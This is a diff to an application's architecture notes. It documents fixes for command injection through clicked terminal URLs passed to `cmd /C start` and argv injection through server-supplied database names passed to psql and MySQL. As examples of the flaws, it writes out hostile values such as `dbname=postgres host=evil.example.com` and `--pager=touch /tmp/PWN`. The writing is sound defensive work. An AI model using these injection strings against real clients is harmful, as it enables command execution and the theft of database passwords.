@@ -3837,6 +3837,78 @@ lands, route the write through `arch-scribe` rather than leaving it for afterwar
     overwrites that file with an empty document) *and* the format (or a fresh script is written with
     a BOM and CRLF it never had). `app/main.rs` reads both at its two sites; the decisions
     themselves are tested here.
+  - `launch.rs` — **what may be handed to an OS launcher**: the boundary where a string the app
+    merely *displayed* becomes a string the operating system *executes*. Two rules hold for
+    everything in it, both stated in the module doc. **No shell** — the argv these functions emit is
+    executed directly, nothing they emit is parsed by `cmd`, `sh` or PowerShell, so a byte that is
+    syntax to a shell is inert; the alternative, filtering every metacharacter of every shell, is how
+    `&` would come to be refused inside a query string while `%` still expanded. And **the string is
+    validated where it stops being data**, not at the site that produced it: a producer may have its
+    own good reasons to be permissive — the terminal's link tagger admits `&` because a query string
+    needs one — and the launcher does not inherit them.
+    `openable_url` and `url_open_argv` are the browser half, and they exist because a clicked
+    terminal link ran arbitrary commands. `open_url` guarded the *scheme* only and then built
+    `cmd /C start "" <url>` itself; Rust's Windows argument encoder quotes an argument only when it
+    is empty or contains a space or a tab, so `&` arrived at `cmd`'s parser raw and was read there as
+    a statement separator. At the other end `schemaic-term`'s `is_url_char` admits `&`, correctly,
+    and `tag_links` marks any run of more than eight such bytes starting at an `http(s)://` — so
+    **any text the terminal panel had merely printed** (a `cat`, a `git log` commit message, an AI
+    CLI streaming a fetched page) containing `https://<8+ chars>&<command>` was drawn as a clickable
+    link, and one click ran `<command>`. Measured with `start` swapped for an inert `echo`: two
+    commands ran. Windows only — the macOS and Linux arms already passed the URL to `open`/`xdg-open`
+    as a single argv entry.
+    The shape is part of the answer, which is why `url_open_argv` returns the whole argv rather than
+    a `bool`: a URL is only as safe as the program it is handed to. On Windows that program is
+    `explorer`, which takes argv and is already this app's launcher for a folder — the `cmd /C start`
+    idiom existed only to get a detached browser, which `explorer` gives directly. `openable_url` is
+    an allowlist of RFC 3986's unreserved and reserved sets and nothing else (no control byte, no
+    space, no non-ASCII, and none of `"`, `<`, `>`, `^`, `|`, `\`, `` ` ``, `{`, `}`), with a
+    case-insensitive `http`/`https` scheme, a non-empty authority, and well-formed
+    percent-encoding — that last one because `%windir%` is a legal-looking path fragment and `cmd`
+    expands it *before* it parses anything, so a `%` that does not begin a `%XX` escape is the tell
+    of a string written for a shell rather than for a browser. The sub-delims `&`, `;`, `$`, `'`,
+    `(`, `)` are **kept**, deliberately, because a real query string needs them and nothing
+    downstream reads them as syntax. `no_shell_ever_reads_a_url` is what holds that: it asserts the
+    *composition*, that a hostile URL is either refused outright or reaches a program that is not a
+    shell as exactly one argv element, so a future launcher that reintroduces a shell fails it
+    however well the gate filters.
+    `psql_target` is the same rule with no shell anywhere in sight, which makes it the clearer
+    instance. **libpq re-parses the value of `-d`**: an argument containing `=`, or beginning
+    `postgresql://`/`postgres://`, is taken as a whole *conninfo string*, so a database named
+    `dbname=postgres host=evil.example.com` overrides the `-h` three arguments earlier and sends the
+    session — with `PGPASSWORD` in its environment — to a server of the name's choosing, while
+    Schemaic's own header goes on naming the intended one (measured against PostgreSQL 16). The name
+    comes from the *server*, so it is not the user's to be trusted with: on a shared or compromised
+    server anyone who may `CREATE DATABASE` writes it, and the schema tree's "Open in CLI" put it
+    straight on the argv. psql has no `--` terminator to hide behind — the detection is on the
+    *value*, not the position — so this one **refuses**, with a message, which is a shape the caller
+    already had for "no client found". The MySQL half of the same finding is fixed the other way
+    round, in `main.rs`'s `mysql_shell_config`: a `--` before the positional database name, because
+    `--pager=touch /tmp/PWN` is dangerous only as an *option* and only because of where it sits in
+    the argv (that name ran a shell command on the user's first query — measured, MariaDB 10.11.14
+    under a pty). A name filter here would be the wrong tool for it.
+    `mysql_cli_tls_args` and `psql_cli_tls_env` carry the connection's `tls` to the spawned client,
+    which neither builder used to do at all: `conn.tls` reached neither, so the client fell back to
+    its own default — `--ssl-mode=PREFERRED` / `sslmode=prefer`, which accepts an unencrypted socket
+    and verifies no certificate — while the password went over it in `MYSQL_PWD`/`PGPASSWORD`, and
+    the app's header, whose own socket really was encrypted, went on reporting TLS. Both are
+    therefore **always non-empty, including for `Disable`**: saying nothing is not neutral. MySQL
+    gets an `--ssl-mode=` flag for every rung plus `--ssl-ca`/`--ssl-cert`/`--ssl-key`; psql gets
+    `PGSSLMODE`/`PGSSLROOTCERT`/`PGSSLCERT`/`PGSSLKEY`, and the **environment rather than the argv**
+    is not symmetry with the password — psql has no `--sslmode` flag at all, the setting exists only
+    inside a conninfo string, which is the one thing `psql_target` refuses to let this path build.
+    Which files are named is left to `connection::Tls::ca_file`/`uses_client_cert` rather than
+    re-decided here, so a non-verifying mode names no CA and half a client pair names neither.
+    `wsl_tls_blocker` is the one case where a transport setting cannot be expressed at all: the three
+    certificate paths travel as argv or as environment values, and a Windows-shaped one (a drive
+    letter, or any backslash) names a file the Linux client cannot open — which fails as a missing
+    file or, depending on the rung, proceeds unverified. So it refuses, the direction
+    `SslMode::STRICTEST` already sends a guess about encryption. A POSIX-shaped path is left alone,
+    including a `/mnt/c/…` the user typed themselves: this is not a ban on WSL plus TLS, only on
+    handing a Linux process a drive letter. **That refusal is what lets `wrap_launcher` forward every
+    variable across `WSLENV` with `/u` and never `/p`** — `/p` is the flag for a value needing
+    Win→WSL path translation, and by the time a WSL config is built there is deliberately no such
+    value left to translate.
   - **Small persisted / UI-state models**, each a flat `Vec` keyed by `conn_id` and each pure +
     tested (they share `history.rs`'s shape; a new one belongs here, not in the UI):
     - `search_history.rs` — recent Find-Anywhere targets (`MAX_PER_CONN`, newest-first, deduped).
@@ -11407,8 +11479,10 @@ Re-introducing the anti-patterns these guard against is a regression:
   third arm — **native `PATH` only, no WSL fallback**, because a host and port mean the same thing on
   both sides of that boundary and a *path* does not: `sqlite3 'C:\data\app.db'` inside WSL doesn't
   fail, it creates an empty database under that literal name. The same arm is why `wrap_launcher`
-  takes `Option<(var, password)>` — a client with no credential sets no variable and names none in
-  `WSLENV`, which is not the same as passing an empty password. **No exceptions** —
+  takes its environment as a `Vec` and treats an empty one as meaningful — a client with no
+  credential sets no variable and names none in `WSLENV`, which is not the same as passing an empty
+  password. (It was `Option<(var, password)>` until the TLS settings had to travel the same road;
+  see `core::launch`.) **No exceptions** —
   `intel::tokenize_range` (the mid-edit byte-position *fallback*) is dialect-aware too, and so are the
   `intel` entry points that reach it (`clause_context`/`clause_continuation`/`join_targets`/
   `expand_star`/`signature_help` all take a `SqlDialect`). It additionally lifts a **quoted identifier**
@@ -11787,6 +11861,29 @@ Re-introducing the anti-patterns these guard against is a regression:
   They asked the alias set, and on SQLite `CAST`, `IF` and `RAISE` sit in the gap, so a table named
   for one of them produced an `ORDER BY` that would not parse. Right quoter, wrong question. See
   `core::intel` for the measurement and the test that holds both lists to the engine itself.
+- **A string handed to a process launcher is validated in `core::launch`, at the boundary where it
+  stops being data.** Two Criticals in one review turned out to be one absent habit: nothing in this
+  codebase validated a string at the point where the app stopped *displaying* it and the operating
+  system started *executing* it. A URL the terminal panel had merely printed reached `cmd /C start`
+  with its `&` unquoted (Rust's Windows encoder quotes only an empty argument or one holding a space
+  or a tab), so one click on a link ran a command; and a **server-supplied** database name reached
+  the DB client's argv from the schema tree's "Open in CLI", where MySQL read
+  `--pager=touch /tmp/PWN` as an option and libpq read `dbname=postgres host=evil.example.com` as a
+  whole conninfo string and dialled the attacker's host with `PGPASSWORD` in hand. Both are written
+  up with their measurements under `core::launch`. The rule has two halves. The validation lives at
+  the **launcher**, not at the producer — a producer may have its own good reasons to be permissive,
+  and the terminal's link tagger admitting `&` for a query string is one — and **no shell is ever in
+  between**, which is why the URI sub-delims that happen to be shell syntax are kept rather than
+  filtered. `launch::tests::no_shell_ever_reads_a_url` enforces that second half by asserting the
+  *composition* rather than the predicate: a hostile URL is either refused or reaches a program that
+  is not a shell as exactly one argv element, so it stays red for any future launcher that
+  reintroduces a shell however well the gate filters. **A refusal is a `Result`, not a caller's
+  `if`** — `mysql_shell`/`psql_shell` and their `_config` halves return
+  `Result<ShellConfig, &'static str>` where they returned an `Option` or a bare config, so every
+  refusal lands on the one arm `open_db_cli` already had for "no client found" (a message spawned in
+  the terminal panel, and no engine badge) and none of them can be forgotten at a call site. Don't
+  add a second gate in a caller, and don't spell one of these decisions inline: `open_url` spawns
+  whatever `launch::url_open_argv` hands it and decides nothing itself.
 - **Every schema-search surface matches through one predicate.** The schema tree's filter box and
   the Find-Anywhere palette answer the same question over the same `DbSchema`, so they go through
   `schema::TableInfo::matches_search` (name or any column) and `schema::ObjectItem::matches_search`
